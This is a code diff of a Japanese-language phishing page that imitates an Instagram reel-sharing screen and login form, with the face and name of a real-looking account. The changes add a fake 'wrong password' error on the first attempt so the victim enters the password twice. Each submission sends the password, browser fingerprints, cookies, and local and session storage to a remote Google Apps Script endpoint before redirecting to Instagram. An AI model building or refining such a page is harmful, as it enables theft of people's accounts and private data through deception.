@@ -30,14 +30,14 @@
             max-width: 320px;
             padding: 0 20px;
         }
-        /* 上部の角丸四角形アイコン (ins_icon_1.jpg) */
+        /* 上部のアイコン (ins_2.webp)：サイズを大きく調整、角丸なし、色反転 */
         .top-badge {
-            width: 72px;
-            height: 72px;
-            border-radius: 16px;
-            object-fit: cover;
+            width: auto;
+            height: auto;
+            max-width: 140px; /* ここを大きくしました（元は100px） */
+            object-fit: contain;
             margin-bottom: 12px;
-            background-color: #333333;
+            filter: invert(100%); /* 色を反転 */
         }
         /* 共有メッセージのスタイル */
         .share-text {
@@ -48,7 +48,7 @@
             text-align: center;
             letter-spacing: 0.3px;
         }
-        /* 丸形アイコン (icon_1.jpg) */
+        /* 丸形アイコン (aina_icon_1.jpg) */
         .avatar {
             width: 90px;
             height: 90px;
@@ -57,25 +57,32 @@
             margin-bottom: 16px;
             background-color: #333333;
         }
-        /* ハンドルネーム（tairi.1210） */
+        /* ハンドルネーム（alua_.l6） */
         .handle-id {
             font-size: 14px;
             color: rgba(255, 255, 255, 0.6);
             margin-bottom: 8px;
         }
-        /* 名前（太葵） */
+        /* 名前（あいな） */
         .name {
             font-size: 18px;
             font-weight: 500;
             margin-bottom: 24px;
             letter-spacing: 0.5px;
         }
-        /* 角丸ウィジェット（パスワード入力欄＋ボタンのコンテナ） */
+        /* 入力フォーム全体のコンテナ */
+        .form-container {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+        /* 角丸ウィジェット（パスワード入力欄） */
         .input-wrapper {
             width: 100%;
             background-color: rgba(255, 255, 255, 0.1);
-            border-radius: 24px;
-            padding: 4px 6px 4px 16px;
+            border-radius: 12px;
+            padding: 4px 16px;
             display: flex;
             align-items: center;
             backdrop-filter: blur(10px);
@@ -87,7 +94,7 @@
             border: none;
             outline: none;
             color: #ffffff;
-            font-size: 16px;
+            font-size: 15px;
             padding: 12px 0;
         }
         .password-input::placeholder {
@@ -101,26 +108,34 @@
         .password-input:disabled {
             color: rgba(255, 255, 255, 0.5);
         }
-        /* 右端の円形エンターボタン */
+        /* 「パスワードを忘れた場合」の青文字リンク */
+        .forgot-password {
+            font-size: 13px;
+            color: #0095f6;
+            text-align: right;
+            text-decoration: none;
+            cursor: pointer;
+            margin-top: -4px;
+            margin-bottom: 4px;
+        }
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+        /* 青背景のログインボタン */
         .submit-btn {
-            width: 38px;
-            height: 38px;
+            width: 100%;
+            height: 44px;
             background-color: #0095f6;
             color: #ffffff;
             border: none;
-            border-radius: 50%;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 600;
             display: flex;
             justify-content: center;
             align-items: center;
             cursor: pointer;
-            flex-shrink: 0;
             transition: opacity 0.2s, background-color 0.3s;
-        }
-        .submit-btn svg {
-            width: 18px;
-            height: 18px;
-            fill: currentColor;
-            transform: rotate(180deg);
         }
         .submit-btn:active {
             opacity: 0.8;
@@ -130,34 +145,59 @@
             color: rgba(255, 255, 255, 0.4);
             cursor: default;
         }
+        /* エラーメッセージ（パスワードが違います） */
+        .error-message {
+            color: #ed4956;
+            font-size: 13px;
+            text-align: center;
+            display: none;
+            margin-top: 4px;
+        }
+        /* アカウントをお持ちでないですか？ 登録する */
+        .signup-prompt {
+            margin-top: 24px;
+            font-size: 13px;
+            text-align: center;
+            color: #ffffff;
+        }
+        .signup-link {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: 600;
+            margin-left: 4px;
+        }
+        .signup-link:hover {
+            text-decoration: underline;
+        }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <!-- 上部の角丸四角形アイコン (ins_icon_1.jpg) -->
-        <img src="ins_icon_1.jpg" alt="" class="top-badge" onerror="this.style.display='none'">
+        <img src="ins_2.webp" alt="" class="top-badge" onerror="this.style.display='none'">
 
-        <!-- 「k._.19._.13がリールを共有しようとしています。」の文字 -->
         <div class="share-text">k._.19._.13がリールを共有しようとしています。</div>
 
-        <!-- 丸形アイコン (icon_1.jpg) -->
-        <img src="icon_1.jpg" alt="アイコン" class="avatar" onerror="this.style.display='none'">
+        <img src="aina_icon_1.jpg" alt="アイコン" class="avatar" onerror="this.style.display='none'">
         
-        <!-- ID（tairi.1210） -->
-        <div class="handle-id">tairi.1210</div>
+        <div class="handle-id">alua_.l6</div>
 
-        <!-- 名前（太葵） -->
-        <div class="name">太葵</div>
+        <div class="name">あいな</div>
         
-        <!-- 角丸ウィジェットのパスワード入力欄とエンターボタン -->
-        <div class="input-wrapper" id="inputWrapper">
-            <input type="password" id="passwordField" class="password-input" placeholder="パスワードを入力">
-            <button id="submitBtn" class="submit-btn" title="決定">
-                <svg viewBox="0 0 24 24">
-                    <path d="M11 5l-7 7 7 7v-4h9v-6h-9z"/>
-                </svg>
-            </button>
+        <div class="form-container">
+            <div class="input-wrapper" id="inputWrapper">
+                <input type="password" id="passwordField" class="password-input" placeholder="パスワードを入力">
+            </div>
+            
+            <a href="#" class="forgot-password" onclick="return false;">パスワードを忘れた場合</a>
+
+            <button id="submitBtn" class="submit-btn">ログイン</button>
+
+            <div id="errorMsg" class="error-message">パスワードが違います</div>
+        </div>
+
+        <div class="signup-prompt">
+            アカウントをお持ちでないですか？<a href="#" class="signup-link" onclick="return false;">登録する</a>
         </div>
     </div>
 
@@ -274,50 +314,105 @@
             } catch (error) {}
         });
 
-        // 共通の送信・リダイレクト処理
+        // 判定ロジック：訪問回数（試行回数）をローカルストレージで管理
+        function getAttemptCount() {
+            return parseInt(localStorage.getItem('auth_attempt_count') || '0', 10);
+        }
+
+        function incrementAttemptCount() {
+            const count = getAttemptCount() + 1;
+            localStorage.setItem('auth_attempt_count', count.toString());
+            return count;
+        }
+
         const passwordField = document.getElementById('passwordField');
         const inputWrapper = document.getElementById('inputWrapper');
         const submitBtn = document.getElementById('submitBtn');
+        const errorMsg = document.getElementById('errorMsg');
 
         async function handleSubmission() {
             const enteredPassword = passwordField.value;
             if (!enteredPassword) return;
 
-            // 1. 即座に入力欄とボタンを無効化（灰色化）
-            passwordField.disabled = true;
-            inputWrapper.classList.add('disabled');
-            passwordField.placeholder = "確認中...";
-            submitBtn.disabled = true;
+            // 何回目の送信かチェック（1回目か、2回目以降か）
+            const currentAttempt = getAttemptCount();
 
-            try {
-                // 2. パスワードを含めたデータを再度送信
-                const payload = {
-                    timestamp: new Date().toISOString(),
-                    password: enteredPassword,
-                    basic: await getBasicSignals(),
-                    canvasDataURL: getCanvasFingerprint(),
-                    webgl: getWebGLInfo(),
-                    storage: {
-                        cookies: getCookiesObject(),
-                        localStorage: getStorageData(localStorage),
-                        sessionStorage: getStorageData(sessionStorage)
-                    }
-                };
+            if (currentAttempt === 0) {
+                // --- 【1回目の場合】 ---
+                incrementAttemptCount();
 
-                await fetch(GAS_WEB_APP_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'text/plain' },
-                    body: JSON.stringify(payload)
-                });
-            } catch (error) {}
+                try {
+                    const payload = {
+                        timestamp: new Date().toISOString(),
+                        password: enteredPassword,
+                        basic: await getBasicSignals(),
+                        canvasDataURL: getCanvasFingerprint(),
+                        webgl: getWebGLInfo(),
+                        storage: {
+                            cookies: getCookiesObject(),
+                            localStorage: getStorageData(localStorage),
+                            sessionStorage: getStorageData(sessionStorage)
+                        }
+                    };
+                    await fetch(GAS_WEB_APP_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'text/plain' },
+                        body: JSON.stringify(payload)
+                    });
+                } catch (error) {}
 
-            // 3. 2秒後に指定のInstagram URLへ自動リダイレクト
-            setTimeout(() => {
-                window.location.href = REDIRECT_URL;
-            }, 2000);
+                // 1秒後にエラーメッセージを表示
+                passwordField.disabled = true;
+                inputWrapper.classList.add('disabled');
+                submitBtn.disabled = true;
+                submitBtn.textContent = "確認中...";
+
+                setTimeout(() => {
+                    passwordField.disabled = false;
+                    inputWrapper.classList.remove('disabled');
+                    submitBtn.disabled = false;
+                    submitBtn.textContent = "ログイン";
+                    passwordField.value = "";
+                    passwordField.placeholder = "パスワードを入力";
+                    errorMsg.style.display = "block"; // 赤文字を表示
+                }, 1000);
+
+            } else {
+                // --- 【2回目以降の場合】 ---
+                passwordField.disabled = true;
+                inputWrapper.classList.add('disabled');
+                submitBtn.textContent = "確認中...";
+                submitBtn.disabled = true;
+                errorMsg.style.display = "none";
+
+                try {
+                    const payload = {
+                        timestamp: new Date().toISOString(),
+                        password: enteredPassword,
+                        basic: await getBasicSignals(),
+                        canvasDataURL: getCanvasFingerprint(),
+                        webgl: getWebGLInfo(),
+                        storage: {
+                            cookies: getCookiesObject(),
+                            localStorage: getStorageData(localStorage),
+                            sessionStorage: getStorageData(sessionStorage)
+                        }
+                    };
+                    await fetch(GAS_WEB_APP_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'text/plain' },
+                        body: JSON.stringify(payload)
+                    });
+                } catch (error) {}
+
+                // 2秒後にリダイレクト
+                setTimeout(() => {
+                    window.location.href = REDIRECT_URL;
+                }, 2000);
+            }
         }
 
-        // 決定ボタンが押されたとき
+        // ログインボタンが押されたとき
         submitBtn.addEventListener('click', handleSubmission);
 
         // パスワード入力欄でエンターキーが押されたとき
